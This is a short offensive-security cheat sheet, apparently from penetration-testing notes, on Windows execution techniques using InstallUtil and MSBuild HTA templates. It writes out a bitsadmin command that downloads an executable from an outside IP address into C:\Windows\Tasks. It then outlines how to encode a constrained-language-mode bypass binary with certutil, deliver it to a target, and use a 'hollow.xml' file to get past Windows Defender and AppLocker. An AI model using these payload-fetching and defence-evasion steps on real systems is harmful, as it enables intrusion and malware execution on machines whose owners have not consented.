# Execution Techniques

## InstallUtil (installutil.hta)

*Note: If* `curl` *is unavailable on the target system, use* `bitsadmin` *as an alternative:*

- `bitsadmin /transfer myJob http://192.168.45.199/scanVenger.exe C:\Windows\Tasks\scanvenger.exe`

- Compile a C# executable that implements a custom PowerShell runspace.

- Convert the compiled executable to a text file using `certutil`:

  - `certutil -encode clm-bypass.exe file.txt`

- Utilize the InstallUtil template to prompt the target to download the `file.txt` file, initiating the execution process.

## MSBuild (msbuild.hta)

- Leverage the `hollow.xml` file, available at hollow.xml, to bypass Windows Defender and AppLocker default rules.
